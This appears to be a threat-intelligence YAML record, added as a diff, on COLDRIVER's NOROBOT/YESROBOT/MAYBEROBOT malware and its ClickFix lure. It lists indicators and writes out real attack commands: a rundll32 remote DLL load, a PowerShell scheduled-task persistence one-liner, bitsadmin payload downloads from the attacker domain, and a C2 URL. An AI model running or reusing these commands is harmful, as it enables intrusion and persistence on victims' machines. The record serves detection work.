@@ -1,0 +1,99 @@
+description: COLDRIVER, a Russian state-sponsored threat group, deployed new malware
+  families NOROBOT, YESROBOT and MAYBEROBOT via a ClickFix lure that uses rundll32
+  to execute malicious DLLs.
+attribution: "Russia State\u2011Sponsored COLDRIVER (APT group)"
+malware_families:
+- NOROBOT
+- YESROBOT
+- MAYBEROBOT
+TTPs:
+  processes:
+  - rundll32.exe
+  - pythonw.exe
+  - powershell.exe
+  commandline:
+  - rundll32.exe inspectguarantee.org\\check\\iamnotarobot.dll,humanCheck
+  - powershell -c "$s = New-Object -ComObject Schedule.Service;$s.Connect();$t = $s.NewTask(0);$p
+    = $t.principal;$p.logontype = 3;$p.RunLevel = 0;$a = $t.Actions.Create(0);$a.Path
+    = \"$env:APPDATA\\Python38-64\\pythonw.exe\";$a.Arguments = \"$env:APPDATA\\Python38-64\\Lib\\libsystemhealthcheck.py\";$a.WorkingDirectory
+    = \"$env:APPDATA\\Python38-64\";$tr = $t.Triggers.Create(9);$tr.userID = \"$env:computername\\\\$env:username\";$tr.enabled
+    = $true;$s.GetFolder(\"\\\").RegisterTaskDefinition(\"System health check\", $t,
+    6, $null, $null, 0) | Out-Null;"
+  - powershell -c "$s = New-Object -ComObject Schedule.Service;$s.Connect();$t = $s.NewTask(0);$p
+    = $t.principal;$p.logontype = 3;$p.RunLevel = 0;$a = $t.Actions.Create(0);$a.Path
+    = \"$env:APPDATA\\Python38-64\\pythonw.exe\";$a.Arguments = \"$env:APPDATA\\Python38-64\\Lib\\libsystemhealthcheck.py\";$a.WorkingDirectory
+    = \"$env:APPDATA\\Python38-64\";$tr = $t.Triggers.Create(9);$tr.userID = \"$env:computername\\\\$env:username\";$tr.enabled
+    = $true;$s.GetFolder(\"\\\").RegisterTaskDefinition(\"System health check\", $t,
+    6, $null, $null, 0) | Out-Null;"
+  - bitsadmin /transfer mydownloadjob /download /priority high https://inspectguarantee.org/libsystemhealthcheck.py
+    %TEMP%\\libsystemhealthcheck.py
+  - bitsadmin /transfer mydownloadjob /download /priority high https://inspectguarantee.org/libcryptopydatasize.py
+    %TEMP%\\libcryptopydatasize.py
+  powershell: []
+  scripting_engine:
+  - "Python backdoor (YESROBOT) executing AES\u2011encrypted commands from https://85.239.52.32/command"
+  - python
+  registry_keys:
+  - HKEY_CURRENT_USER\\SOFTWARE\\Classes\\.pietas /v ratio /t REG_BINARY /d f5e210ec114e1992b81ff89be58cfb2778005f734972239b9655b23fcee5593f19554d0a74dad52c67956781367b06e6
+    /f
+  image_load:
+  - iamnotarobot.dll (export humanCheck)
+  - checkme.dll
+  - machinerie.dll
+  network_connections:
+  - process: rundll32.exe
+    destination: inspectguarantee.org
+    port: 80
+  - process: pythonw.exe
+    destination: system-healthadv.com
+    port: 443
+  - process: pythonw.exe
+    destination: 85.239.52.32
+    port: 443
+  - executable: script.py
+    destination: system-healthadv.com
+    port: 443
+  - executable: script.py
+    destination: 85.239.52.32
+    port: 443
+  file_activity:
+  - '%TEMP%\\libsystemhealthcheck.py'
+  - '%TEMP%\\libcryptopydatasize.py'
+  - $env:APPDATA\\Python38-64\\pythonw.exe
+  - C:\\Windows\\System32\\rundll32.exe
+  persistence:
+  - Scheduled task "System health check" running pythonw.exe with libsystemhealthcheck.py
+  process_relations:
+  - rundll32.exe -> iamnotarobot.dll
+  - pythonw.exe (via scheduled task) -> libsystemhealthcheck.py
+IOCs:
+  hashes:
+  - c4d0fba5aaafa40aef6836ed1414ae3eadc390e1969fdcb3b73c60fe7fb37897
+  - 2e74f6bd9bf73131d3213399ed2f669ec5f75392de69edf8ce8196cd70eb6aee
+  - 3b49904b68aedb6031318438ad2ff7be4bf9fd865339330495b177d5c4be69d1
+  - b60100729de2f468caf686638ad513fe28ce61590d2b0d8db85af9edc5da98f9
+  ips:
+  - 85.239.52.32
+  domains:
+  - inspectguarantee.org
+  - system-healthadv.com
+  - viewerdoconline.com
+  - documentsec.com
+  - onstorageline.com
+  - applicationformsubmit.me
+  - oxwoocat.org
+  - ned-granting-opportunities.com
+  - blintepeeste.org
+  - preentootmist.org
+  - captchanom.top
+  - bce2a7165ceead4e3601e311c72743e0059ec2cd734ce7acf5cc9f7d8795ba0f
+  - southprovesolutions.com
+  - f2da013157c09aec9ceba1d4ac1472ed049833bc878a23bc82fe7eacbad399f4
+  urls:
+  - https://85.239.52.32/command
+  - https://{tgtIp}/command
+authors:
+- Wesley Shields
+reference: https://cloud.google.com/blog/topics/threat-intelligence/new-malware-russia-coldriver
+date_of_publication: October 22, 2025
+file_creation_date: October 22, 2025
